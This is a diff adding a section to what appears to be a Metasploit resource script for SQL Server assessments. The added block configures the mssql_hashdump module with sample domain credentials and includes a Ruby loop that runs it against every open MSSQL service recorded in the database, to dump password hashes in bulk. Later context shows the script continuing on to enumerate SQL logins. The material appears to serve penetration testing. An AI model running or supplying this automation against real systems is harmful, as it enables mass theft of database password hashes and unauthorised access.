@@ -111,6 +111,29 @@ end
 
 
 #---------------------------------
+# Dump password hashes if possible
+#---------------------------------
+use auxiliary/scanner/mssql/mssql_hashdump
+set USERNAME User1
+set PASSWORD Password1
+set USE_WINDOWS_AUTHENT true
+set DOMAIN acme.com
+set VERBOSE false
+set THREADS 1
+ 
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "mssql" and service.state == "open"
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("run")
+    end
+  end
+end
+</ruby>
+
+#---------------------------------
 # Dump all of the SQL logins
 #---------------------------------
 use auxiliary/admin/mssql/mssql_enum_sql_logins
